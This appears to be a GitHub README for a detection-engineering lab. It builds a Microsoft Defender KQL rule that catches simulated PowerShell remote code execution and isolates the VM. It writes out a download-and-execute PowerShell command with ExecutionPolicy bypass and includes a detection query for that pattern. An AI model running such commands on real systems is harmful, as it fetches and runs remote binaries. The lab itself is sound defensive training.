## 📌 Project Overview

This project demonstrates the design and implementation of a custom detection rule in Microsoft Defender for Endpoint (MDE) to identify and automatically respond to simulated Remote Code Execution (RCE) activity on a Windows Virtual Machine.

The lab simulates a real-world SOC detection engineering and incident response workflow.

## 🔍 Lab Components
- Windows VM deployment  
- MDE onboarding and telemetry validation  
- Simulated PowerShell-based RCE activity  
- Custom KQL detection rule creation  
- Automated device isolation  
- Investigation package analysis  
- Incident resolution and cleanup
<img width="457" height="194" alt="Screenshot 2026-03-01 at 6 14 05 PM" src="https://github.com/user-attachments/assets/6b60f3f4-0e10-41cb-9fae-88fdb5b8e654" />

## Environment Setup
- Windows VM Configuration
- Created a Windows VM with strong credentials
- Disabled Windows Firewall (wf.msc)
- Ensured internet exposure for threat simulation

## Onboarding to Microsoft Defender for Endpoint
- Onboarded the VM to Microsoft Defender for Endpoint
- Verified device visibility in the MDE portal:

## Telemetry Validation
- Confirmed log ingestion using Advanced Hunting:
<img width="570" height="167" alt="Screenshot 2026-03-01 at 6 17 34 PM" src="https://github.com/user-attachments/assets/649b42a3-de35-415d-9450-86edcc1ea212" />

## Threat Simulation
- Simulated a PowerShell-based remote code execution scenario involving:
- ExecutionPolicy bypass
- File download from a remote source
- Silent installation of a binary

## 🧪 Simulated Command
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'hxxps://sacyberrange00[.]blob.core[.]windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
This behavior mimics post-exploitation techniques commonly observed in RCE incidents.

## 🧠 Detection Engineering
## 🎯 Detection Objective
Detect PowerShell execution that:
- Uses Invoke-WebRequest
- Uses Start-Process
- Is scoped to a specific VM
- Occurs within the last hour
## 🧾 KQL Detection Query
let VMName = "my-vm-name";
DeviceProcessEvents
| where DeviceName == VMName
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| where InitiatingProcessCommandLine contains "Start-Process"
| where Timestamp > ago(1h)
This query monitors process execution telemetry for suspicious download-and-execute patterns.

## ⚙️ Custom Detection Rule Configuration
Within Microsoft Defender for Endpoint:
1. Navigate to Advanced Hunting
2. Create a Custom Detection Rule

## 📋 Rule Settings
- Severity: Medium
- Scope: Specific device
- Frequency: Every hour
- Automated Actions:
  - ✅ Isolate Device
  - ✅ Collect Investigation Package
 
  ## 🚨 Alert & Automated Containment
After executing the simulated attack:
- Logs appeared in Advanced Hunting
- Custom detection rule triggered
- VM was automatically isolated
- Investigation package was generated
Loss of connectivity confirmed successful isolation.

## 🔎 Investigation Workflow
From the MDE portal:
  1. Navigate to:
https://security.microsoft.com/machines
  2. Select the target VM
  3. Open Action Center
  4. Review the generated investigation package

## 📦 Investigation Package Includes

- Process tree analysis
- File modifications
- Registry changes
- Network connections
- Event logs
- Memory artifacts
This supports detailed forensic analysis and incident validation

## 🏁 Key Outcomes
- Successfully simulated RCE behavior
- Built a scoped detection rule using KQL
- Automated containment using device isolation
- Preserved forensic artifacts for investigation
- Completed full incident lifecycle (detect → contain → investigate → resolve).

## 🛡️ Skills Demonstrated
- KQL (Kusto Query Language)
- Microsoft Defender for Endpoint
- Detection engineering
- PowerShell threat analysis
- Incident response workflow
- Automated containment strategy

SOC-level alert triage
